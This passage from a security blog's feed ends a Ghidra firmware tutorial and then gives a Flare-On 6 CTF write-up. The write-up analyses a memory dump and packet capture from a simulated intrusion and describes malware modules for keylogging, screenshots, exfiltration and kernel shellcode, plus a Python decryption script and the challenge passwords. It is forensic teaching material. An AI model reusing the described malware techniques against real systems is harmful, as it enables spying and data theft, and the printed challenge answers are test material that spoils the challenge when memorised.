load</figcaption></figure><p>After SVD-Loader has finished importing we can go to the memory map window.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image11.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="1322" height="585" srcset="https://blog.attify.com/content/images/size/w600/2021/10/image11.png 600w, https://blog.attify.com/content/images/size/w1000/2021/10/image11.png 1000w, https://blog.attify.com/content/images/2021/10/image11.png 1322w" sizes="(min-width: 720px) 720px"><figcaption>SVD-Loader created memory blocks</figcaption></figure><p>SVD-Loader has automatically created the memory blocks and peripherals by parsing the SVD. However it&apos;s worthwhile to note that the plugin didn&#x2019;t create the SRAM memory block at <code>0x20000000</code>. We can create the SRAM block manually. At this point we can run Ghidra auto-analysis with the default options from Analysis -&gt; Auto analyze.</p><p>Next we can go to 080007ee to cross-check the decompiled code of the password checking logic.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image6.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="410" height="387"><figcaption>Ghdiar wasn&apos;t able to identify the function at 080007ee</figcaption></figure><p>Unfortunately Ghidra wasn&#x2019;t able to identify the function on its own. In such cases we can manually define a function by right clicking at that address -&gt; Disassemble. Doing so, Ghidra creates a function at that address with the same decompiled code as before.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2021/10/image12-1.png" class="kg-image" alt="Analyzing bare metal firmware binaries in Ghidra" loading="lazy" width="733" height="702" srcset="https://blog.attify.com/content/images/size/w600/2021/10/image12-1.png 600w, https://blog.attify.com/content/images/2021/10/image12-1.png 733w" sizes="(min-width: 720px) 720px"><figcaption>Decompiled code listing of FUN_080007ee after creating memory map with SVD-Loader</figcaption></figure><h2 id="final-words">Final Words</h2><p>In this post, we have seen how to analyze a bare metal firmware in Ghidra. A bare metal firmware is just a binary blob. To correctly analyze such a file we need to specify the load address and create the memory segments. Information about the load address and memory segments can be found in the datasheet and compiler header files. The memory map can also be automatically created using SVD-Loader by parsing SVD files. However SVD-Loader may not create all segments. SVD-Loader will only create segments that are defined in the SVD file. Thus it&#x2019;s important to always cross-check with the datasheet to ensure correctness.</p>]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[Flare-On 6 CTF WriteUp (Part 12)]]></title>
      <description><![CDATA[Flare-On 6 CTF WriteUp : help]]></description>
      <link>https://blog.attify.com/flare-on-6-ctf-writeup-part12/</link>
      <guid isPermaLink="false">5d8b479238c2d600381ca014</guid>
      <category><![CDATA[CTF]]></category>
      <category><![CDATA[Flare-on]]></category>
      <category><![CDATA[Reversing]]></category>
      <dc:creator><![CDATA[Barun]]></dc:creator>
      <pubDate>Sun, 20 Oct 2019 18:44:00 GMT</pubDate>
      <media:content url="https://blog.attify.com/content/images/2019/10/12.png" medium="image" />
      <content:encoded><![CDATA[<img src="https://blog.attify.com/content/images/2019/10/12.png" alt="Flare-On 6 CTF WriteUp (Part 12)"><p>This is the twelfth and final part of the Flare-On 6 CTF WriteUp Series.</p><h2 id="12-help">12 - help</h2><p>The challenge reads</p><blockquote>You&apos;re my only hope FLARE-On player! One of our developers was hacked and we&apos;re not sure what they took. We managed to set up a packet capture on the network once we found out but they were definitely already on the system. I think whatever they installed must be buggy - it looks like they crashed our developer box. We saved off the dump file but I can&apos;t make heads or tails of it - PLEASE HELP!!!!!!</blockquote><p>We have two files - </p><ul><li><em>help.dmp</em> - A 2 GB memory dump</li><li><em>help.pcapng</em> - Packet capture</li></ul><h3 id="identifying-the-image">Identifying the image</h3><p>For analyzing the memory dump we will be using <a href="https://github.com/volatilityfoundation/volatility">Volatility</a> along with <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools">WinDbg</a>. Make sure to use the bleeding edge version of Volatility on GitHub and not the <a href="https://www.volatilityfoundation.org/26">2.6 release</a> which is quite old.</p><p>At first we need to identify the image with <code><a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#imageinfo">imageinfo</a></code> or <code><a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#kdbgscan">kdbgscan</a></code> command. Unfortunately, for this specific image none of the commands work out of the box as shown in the snippet below.</p><pre><code>$ vol.py -f help.dmp imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
</code></pre><p>In such cases where Volatility is unable to infer on its own, we have to manually specify the <a href="https://github.com/volatilityfoundation/volatility/wiki/2.6-Win-Profiles#profile-lists">image profile</a> to use with the <code>--profile</code> flag. For example using the profile <code>Win7SP1x64</code> volatility correctly identifies the image.</p><pre><code>$ vol.py -f help.dmp --profile=Win7SP1x64 imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : WindowsCrashDumpSpace64 (Unnamed AS)
                     AS Layer3 : FileAddressSpace (/home/bb/Documents/RCE-InfoSec/Flare-on 2019/12 - help/help.dmp)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002c390a0L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002c3ad00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2019-08-02 14:38:33 UTC+0000
     Image local date and time : 2019-08-02 10:38:33 -0400</code></pre><h3 id="preliminary-analysis">Preliminary Analysis</h3><!--kg-card-begin: markdown--><p>Volatility supports a whole slew of different analysis commands. For brevity, we will only be mentioning the relevant commands but the reader is encouraged to try them all. For each of the commands we need to specify the profile using the <code>--profile=Win7SP1x64</code> flag.</p>
<!--kg-card-end: markdown--><h4 id="screenshot-command"><a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference-Gui#screenshot">Screenshot</a> command</h4><p>This command takes a screenshot from each desktop on the system. Running the command generates several screenshots one of which looks interesting.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/session_1.WinSta0.Default.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 1: An interesting screenshot</figcaption></figure><p>As shown in Figure 1, there is Google Chrome and KeyPass running. A database named <em>keys.kdb</em> is currently open in the KeyPass instance.</p><h4 id="modules-command"><a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#modules">Modules</a> command</h4><p>This command displays the list of kernel modules that were loaded in the system at the time the memory dump was captured.</p><pre><code>$ vol.py -f help.dmp --profile=Win7SP1x64 modules

Offset(V)          Name                 Base                             Size File
------------------ -------------------- ------------------ ------------------ ----
0xfffffa800183e890 ntoskrnl.exe         0xfffff80002a49000           0x5e7000 \SystemRoot\system32\ntoskrnl.exe
0xfffffa800183e7a0 hal.dll              0xfffff80002a00000            0x49000 \SystemRoot\system32\hal.dll

-- snip--

0xfffffa800428ff30 man.sys              0xfffff880033bc000             0xf000 \??\C:\Users\FLARE ON 2019\Desktop\man.sys
</code></pre><p>There&apos;s a driver named <em>man.sys</em> which was loaded from the path <code>C:\Users\FLARE ON 2019\Desktop\man.sys</code>. Since system drivers do not usually reside on the Desktop we can be pretty sure that this is related to the challenge.</p><h3 id="dumping-man-sys">Dumping man.sys</h3><p><em>man.sys</em> is loaded at the address <code>0xfffff880033bc000</code>. We can either use Volatility or WinDbg for dumping the module. Here I have used WinDbg as I found it to work better than Volatility as far as memory dumping is concerned. Ensure that the <a href="https://stackoverflow.com/a/30019890/">path to the symbol server</a> is properly set in WinDbg.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-22.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 2: Missing MZ header</figcaption></figure><p>We can use the <code>db</code> command to hex dump a memory region. However as shown in Figure 2, the MZ header is missing from <em>man.sys </em>which indicate that the corresponding page must have been paged out from memory. Regardless, we can still use the <code>.writemem</code> command to dump a considerable chunk of memory (say 100KB) and load it as a binary file in IDA.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-23.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 3: Dumping man.sys</figcaption></figure><p>The dumped file is of size 60 KB. Searching for strings we locate the path to the PDB file embedded in the PE.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-24.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 4: Embedded PDB file path</figcaption></figure><h3 id="dumping-other-drivers-and-dlls">Dumping other drivers and DLLs</h3><p>Grepping for the strings &quot;flareon_2019&quot; and &quot;pdb&quot; we can find other relevant files that are related to the challenge as shown in Figure 5.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-26.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 5: DLLs and drivers related to the challenge</figcaption></figure><p><strong>List of drivers</strong></p><ul><li>stmedit</li><li>shellcodedriver</li><li>man</li></ul><p><strong>List of DLLs</strong></p><ul><li>cd</li><li>cryptodll</li><li>filedll</li><li>keylogdll</li><li>networkdll</li><li>screenshotdll</li></ul><p>Among the drivers we already have <em>man.sys</em>. The other two - <em>shellcodedriver</em> and <em>stmedit</em> can be located in memory using the <a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference-Mal#yarascan"><code>yarascan</code></a> volatility command as shown in Figure 6.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-27.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 6: Using yarascan</figcaption></figure><p>stmedit is located within memory of process svchost.exe with pid 876. Using the <code><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-process">!process</a></code> windbg extension, <em>svchost.exe</em> with pid 876 has its <code>EPROCESS</code> at <code>fffffa80034a4b30</code></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-30.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 7: Finding EPROCESS of svchost</figcaption></figure><p>Knowing the address of <code>EPROCESS</code> we can set the process context using the <code><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-process--set-process-context-">.process</a></code> command. </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-31.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 8: Setting the process context</figcaption></figure><p>Navigating to <code>b260c9</code> we can cross check that it indeed contains the stmedit string as found in Volatility using <code>yarascan</code>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-32.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 9: Cross checking the output of yarascan</figcaption></figure><p>From here we can search backwards to locate the start of the MZ header as shown in Figure 10.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-33.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 10: Searching backwards for MZ header</figcaption></figure><p>Next, we can use the <code>.writemem</code> command to dump stmedit.sys in the same way as we did earlier.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-34.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 11: Dumping stmedit</figcaption></figure><p>Apart from <em>shellcodedriver </em>(it has the MZ header missing), the same technique can be reused to dump each of the 6 DLLs. (The complete <em>shellcodedriver</em> file will later be found in the pcap).</p><h3 id="analyzing-the-dlls-drivers">Analyzing the DLLs &amp; drivers</h3><p>Before we look at the DLLs separately there are several techniques that are common across all the DLLs and drivers.</p><p>None of the DLLs import WinAPI functions statically using the IAT. Instead functions are resolved dynamically using <code>LoadLibrary</code> or by <a href="http://sandsprite.com/CodeStuff/Understanding_the_Peb_Loader_Data_List.html">parsing</a> <code>PEB_LDR_DATA</code>. For obtaining the addresses of the API, either <code>GetProcessAddress</code> is used or in some cases the export table of the module is parsed. Further to harden analysis, the names of the functions are encrypted and are only decrypted at run-time before it&apos;s about to be called.</p><p>For example in Figure 12, the <code>rc4</code> function decrypts the string<code>CreateFileA</code>. It is worth noting that each such string is encrypted with a different key.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-35.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 12: Decrypting API names at runtime</figcaption></figure><p>The <code>rc4</code> function takes four parameters -</p><ul><li>A pointer to the key</li><li>Size of the key in bytes</li><li>A pointer to the encrypted buffer. After the function returns this will hold the decrypted contents</li><li>Size of the encrypted buffer</li></ul><p>In Figure 12, the key and encrypted buffer are <code>{0x91, 0xe8, 0xa5, 0x7d}</code> and <code>{0xbd, 0x64, 0x20, 0x46, 0xad, 0xad, 0xe8, 0x7a, 0x39, 0x7c, 0x26}</code> respectively. This can be decrypted using the <a href="https://pypi.org/project/pycryptodome/">PyCryptodome</a> Python library.</p><pre><code>&gt;&gt;&gt; from Crypto.Cipher import ARC4
&gt;&gt;&gt; key = &apos;&apos;.join(map(chr, [0x91, 0xe8, 0xa5, 0x7d]))
&gt;&gt;&gt; ct = &apos;&apos;.join(map(chr, [0xbd, 0x64, 0x20, 0x46, 0xad, 0xad, 0xe8, 0x7a, 0x39, 0x7c, 0x26]))
&gt;&gt;&gt; 
&gt;&gt;&gt; ARC4.new(key*2).decrypt(ct)
&apos;CreateFileA&apos;</code></pre><p>Lastly another technique common across all the DLLs is the use of a function dispatcher to make the WinAPI function call. The dispatcher takes a variable number of arguments depending on the WinAPI function it wants to call. Let&apos;s look at two examples to make it clear.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-36.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 13: Calling socket</figcaption></figure><p>In Figure 13, the method <code>call_function</code> is the function dispatcher we are talking about. Here it wants to call <code><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-socket">socket</a></code> which is exported from <em>Ws2_32.dll</em>. The first parameter is a handle to the module containing the function; the second parameter is a pointer to a buffer containing the name of the function. The name of the function is decrypted at runtime as we saw just a while ago. The third parameter indicates the number of arguments that the function requires which is 3 as <code>socket</code> takes three arguments. After the third comes the actual arguments to the function.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-37.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 14: Calling htons</figcaption></figure><p>Let&apos;s consider another example as in Figure 14. The <code><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-htons">htons</a></code> function exported from <em>Ws2_32.dll</em> takes a single parameter. Correspondingly the third parameter passed to <code>call_function</code> is 1. After that we have the actual argument to <code>htons</code> - the binding port number.</p><h3 id="cd-dll">cd.dll</h3><ul><li>Exports a function named <code>c</code></li><li>Sets up a listener on port 4444 and spawns a thread for each incoming connection</li><li>Reads 4 bytes from the socket. This indicates the size of the payload about to follow</li><li>The next 4 bytes are some sort of code (Figure 15) based on which it sends a IOCTL to a driver.</li></ul><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-38.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 15: Various IOCTL codes</figcaption></figure><ul><li>The driver to which it sends the IOCTLs is named FLID (Figure 16).</li></ul><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-39.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 16: Driver has the name FLID</figcaption></figure><h3 id="cryptodll">cryptodll</h3><ul><li>Exports a function named <code>e</code></li><li>This function takes in a single parameter - a pointer to a structure of &#xA0;the following form</li></ul><pre><code>struct Buffer_info
{
    QWORD src_buffer_size;
    LPBYTE src_buffer;
    QWORD dst_buffer_size;
    LPBYTE dst_buffer;
}</code></pre><ul><li>The function compresses (LZNT1) and encrypts (RC4) <code>src_buffer</code> to <code>dst_buffer</code></li><li>For Compression it uses the NT function <code><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntifs/nf-ntifs-rtlcompressbuffer">RtlCompressBuffer</a></code></li><li>The key used for encryption is the current username obtained from <code><a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea">GetUserNameA</a></code></li></ul><h3 id="filedll">filedll</h3><ul><li>Exports a function named <code>i</code></li><li>Contains functionality to &#xA0;create, read, write and search for a file as shown in Figure 17.</li></ul><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-40.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 17: Functionality in filedll</figcaption></figure><h3 id="keylogdll">keylogdll</h3><ul><li>Exports a function named <code>l</code></li><li>As its name suggests, the dll implements key logging functionality</li></ul><h3 id="networkdll">networkdll</h3><ul><li>Exports a function named <code>s</code></li><li>Contains functionality to send data to the host 192.168.1.243 at a configurable port as shown in Figure 18.</li></ul><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-41.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 18: Networkdll can send a piece of data to 192.168.1.243</figcaption></figure><h3 id="screenshotdll">screenshotdll</h3><ul><li>Exports a function named <code>t</code></li><li>Contains functionality to capture a bitmap screenshot of the desktop</li></ul><h3 id="shellcodedriver">shellcodedriver</h3><ul><li>This is a 32-bit driver whose sole purpose is to execute a piece of shellcode in kernel space</li></ul><h3 id="stmedit">stmedit</h3><ul><li>This is a <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/network/callout-driver">callout driver</a> using <a href="https://docs.microsoft.com/en-us/windows/win32/fwp/windows-filtering-platform-start-page">Windows Filtering Platform</a> (WFP) to modify the network traffic at runtime</li><li>Much of the code in the driver has been taken from <a href="https://github.com/microsoft/Windows-driver-samples/blob/master/network/trans/stmedit/README.md">https://github.com/microsoft/Windows-driver-samples/blob/master/network/trans/stmedit/README.md</a> which we can use for reference</li><li>The purpose of the driver is to encrypt/decrypt the network traffic after/before it is-sent/reaches from/the user space application</li><li>The encryption algorithm is a simple 8 byte XOR</li><li>One of the XOR key is hardcoded in the driver as shown in Figure 19.</li><li>Complete analysis of the driver is out of scope of this post.</li></ul><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-42.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 19: Hardcoded XOR key</figcaption></figure><h3 id="man">man</h3><ul><li>This driver handles IOCTLs from <em>cd.dll</em> as in Figure 20.</li><li>Compete understanding of this driver is not necessary to complete the challenge</li></ul><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-54.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 20: man.sys handles IOCTLs from cd.dll</figcaption></figure><h3 id="decrypting-the-pcap-traffic">Decrypting the pcap traffic</h3><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-43.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 21: NetworkMiner</figcaption></figure><p><a href="https://www.netresec.com/?page=networkminer">NetworkMiner</a> is a great tool to get a quick summary of a packet capture. Using the tool we can see there are too many hosts involved. However not all of the traffic in the pcap is relevant to this challenge. By analyzing <em>networkdll</em> we already know that traffic to host 192.168.1.243 is related to this challenge. From <em>cd.dll</em> we also know any traffic to port 4444 is also relevant. All in all the following TCP streams in the pcap are important.</p><ul><li>Traffic to host 192.168.1.243 on ports 6666, 7777, 8888</li><li>Traffic to host 192.168.1.244 on port 4444</li></ul><p>To extract the TCP streams from the pcap we can use <a href="https://github.com/simsong/tcpflow">tcpflow</a> which automatically groups them by host and port. We get 285 flows in total out of which we only need to consider the relevant traffic as just discussed.</p><p><strong>Decrypting traffic to 192.168.1.244:4444</strong></p><p>This traffic is just XOR encryted with the 8 byte key (<code>5d f3 4a 48 48 48 dd 23</code>) which we found earlier. There are 20 such TCP streams. After decrypting, one stream by virtue of its large size (4 KiB) stands out. This stream contains the complete <em>shellcodedriver</em> at offset 12 as shown in Figure 22.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-44.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 22: shellcode driver</figcaption></figure><p><strong>Decrypting traffic to 192.168.1.243:6666</strong></p><p>There are 2 such streams of sizes 50 bytes and 4.53 KiB respectively. First we need to figure out the 8 byte XOR key. Lets have a look at the 50 bytes sized stream as in Figure 23.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-45.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 23: Stream of size 50 bytes to 192.168.1.243:6666</figcaption></figure><p>The first 4 bytes (encrypted) are <code>cc 69 94 fa</code>. We can assume that these bytes indicates the length of the stream, i.e. the data about to follow. This is because as otherwise the receiving side will have no way to know how many bytes to <code>recv</code>. The size of the stream is 50 (0xcc) which takes up 1 bytes of space. If the size is indicated by 4 bytes, the other three bytes will be zero. Xoring with zero has no effect which indirectly means the last three bytes will reveal a part of the key.</p><p>Indeed, if we do a yarascan for the bytes <code>69 94 fa</code> in the <em>svchost.exe</em> process, we get exactly 1 hit which is the XOR key (<code>d5 69 94 fa 25 ec df da</code>) as shown in Figure 24.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-46.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 24: XOR key for port 6666</figcaption></figure><p>The traffic here is doubly encrypted. After XOR decrypting, we need to RC4 decrypt followed by LZNT1 decompression. The key for RC4 is the username obtained from <code>GetUserNameA</code>. The username is <code>FLARE ON 2019</code> which we can obtain from <code>hashdump</code>. We need to append a null byte to the username as per the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea#return-value">docs</a>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-47.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 25: Obtaining the username</figcaption></figure><p>The following Python script RC4 decrypts with the username followed by LZNT1 decompression.</p><pre><code>from Crypto.Cipher import ARC4
import ctypes
import sys

def decompress(data):
	ntdll = ctypes.windll.ntdll
	RtlDecompressBuffer = ntdll.RtlDecompressBuffer

	COMPRESSION_FORMAT_LZNT1 = 0x2
	COMPRESSION_ENGINE_MAXIMUM = 256
	STATUS_SUCCESS  = 0

	RtlDecompressBuffer.argtypes = [
	            ctypes.c_ushort, # USHORT CompressionFormat
	            ctypes.c_void_p, # PUCHAR UncompressedBuffer
	            ctypes.c_ulong,  # ULONG  UncompressedBufferSize
	            ctypes.c_void_p, # PUCHAR CompressedBuffer
	            ctypes.c_ulong,  # ULONG  CompressedBufferSize
	            ctypes.c_void_p, # PULONG FinalUncompressedSize
	]

	RtlDecompressBuffer.restype = ctypes.c_uint	
	finaluncompsize = ctypes.c_ulong(0)
	comp_buffer = ctypes.create_string_buffer(data)
	uncomp_buffer = ctypes.create_string_buffer(len(comp_buffer)*1)

	res = RtlDecompressBuffer(
		COMPRESSION_FORMAT_LZNT1, 
		ctypes.byref(uncomp_buffer), 
		ctypes.c_ulong(len(uncomp_buffer)), 
		ctypes.byref(comp_buffer), 
		ctypes.c_ulong(len(comp_buffer)), 
		ctypes.byref(finaluncompsize)
	)
	print res
	if res == 0:
		return uncomp_buffer[0:finaluncompsize.value]
	else:
		return None

def decrypt(ct, key):
	arc4 = ARC4.new(key)
	pt = arc4.decrypt(ct)
	return pt

def decrypt_and_decompress(data, key):
	decry = decrypt(data, key)
	return decompress(decry)

key = &apos;FLARE ON 2019&apos; + &apos;\x00&apos;
ct = open(sys.argv[1], &apos;rb).read()
pt = decrypt_and_decompress(ct, key+&apos;\x00&apos;)
open(&apos;output.bin&apos;, &apos;wb&apos;).write(pt)</code></pre><p>After double decryption, one of the files contain the text &quot;C:\keypass\key.kdb&quot;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-48.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 26: Path to keys.kdb</figcaption></figure><p><strong>Decrypting traffic to 192.168.1.243:7777</strong></p><p>There are 12 such streams. The 8 byte XOR key can similarly be found as we did for 6666. It is <code>4a 1f 4b 1c b0 d8 25 c7</code>. It&apos;s also doubly encrypted. After decrypting we get bitmap files some of which are shown in Figure 27 and Figure 28.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/12-26.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 27: Four decrypted bitmaps shown tiled</figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/12-27.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 28: Four decrypted bitmaps shown tiled</figcaption></figure><p>Looking at the images we come to know about our objective. Our much coveted flag is in a KeePass database named <em>keys.kdb</em>. The password of the KeyPass database is of size 18 characters.</p><p><strong>Decrypting traffic to 192.168.1.243:8888</strong></p><p>There are 5 streams. The XOR key is <code>f7 8f 78 48 47 1a 44 9c</code>. It&apos;s also doubly encrypted. The traffic consists of keylogger captured data as we can see in Figure 29.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-49.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 29: The keylogger captured some keystrokes wrong</figcaption></figure><p>Also note that the keylogger captured some keystrokes wrong. For instance from Figure 26, the user typed <code>nslookup some_blog.com</code> whereas the keylogger captured <code>nslookup soeblogcom</code>.</p><p>In another file we find the string &quot;th1sisth33nd111&quot; which looks to be the password for <em>keys.kdb</em></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-50.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 30: Likely password of the keypass database</figcaption></figure><h3 id="retrieving-the-kdb">Retrieving the KDB</h3><p>A KDB 1.x file <a href="https://gist.github.com/lgg/e6ccc6e212d18dd2ecd8a8c116fb1e45#file-signature-1-4-bytes--file-signature-2-4-bytes">begins with the bytes</a> <code>03 D9 A2 9A 65 FB 4B B5</code>. Searching for these bytes in the dump we can locate the kdb file.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-51.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 31: Locating the KDB file</figcaption></figure><p>Unfortunately, using the password &quot;th1sisth33nd111&quot; fails to open the kdb. This is possible as the keylogger is buggy and doesn&apos;t capture all key strokes correctly. Also from the screenshots we know the length of the password is 18 whereas the keylogg&apos;d password is of size 15.</p><h3 id="figuring-out-the-correct-password">Figuring out the correct password</h3><p>Searching for &quot;th3&quot; we locate a 16 character string which looks to be a part of the correct password.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-52.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 32: A part of the correct password</figcaption></figure><p>The correct password to the keypass database can be thus inferred and is &quot;Th!s_iS_th3_3Nd!!!&quot;. Opening the kdb file we finally have the much coveted flag. </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/10/image-53.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 12)" loading="lazy"><figcaption>Figure 33: The flag</figcaption></figure><p>Flag: 